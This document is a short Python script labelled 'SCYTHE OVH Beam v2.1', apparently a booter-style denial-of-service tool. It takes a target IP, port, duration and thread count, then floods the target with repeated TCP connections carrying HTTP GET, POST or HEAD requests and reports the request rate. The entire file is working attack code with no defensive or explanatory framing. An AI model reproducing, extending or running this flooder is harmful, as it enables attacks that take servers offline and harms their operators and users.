# SCYTHE OVH Beam v2.1
import sys, socket, time, random, threading
if len(sys.argv) < 6: print('Usage: python3 ovh-beam.py <method> <ip> <port> <time> <threads>'); sys.exit(1)
method, ip, port, duration, threads = sys.argv[1], sys.argv[2], int(sys.argv[3]), int(sys.argv[4]), int(sys.argv[5])
print(f'[SCYTHE] OVH Beam: {ip}:{port} | {duration}s')
total = 0
lock = threading.Lock()
def flood():
  global total
  end = time.time() + duration
  while time.time() < end:
    try:
      for _ in range(10):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        try:
          s.connect((ip, port))
          if method == 'GET': s.send(b'GET / HTTP/1.1\r\nHost: ' + ip.encode() + b'\r\n\r\n')
          elif method == 'POST': s.send(b'POST / HTTP/1.1\r\nHost: ' + ip.encode() + b'\r\nContent-Length: 0\r\n\r\n')
          elif method == 'HEAD': s.send(b'HEAD / HTTP/1.1\r\nHost: ' + ip.encode() + b'\r\n\r\n')
          s.close();
          with lock: total += 1
        except: pass
      time.sleep(0.1)
    except: pass
for _ in range(threads):
  threading.Thread(target=flood, daemon=True).start()
start = time.time()
while time.time() - start < duration:
  print(f'[OVH-BEAM] Packets: {total} | RPS: {int(total/max(1,time.time()-start))} | Elapsed: {time.time()-start:.1f}s')
  time.sleep(1)
print(f'[OVH-BEAM] Completed: {total} packets')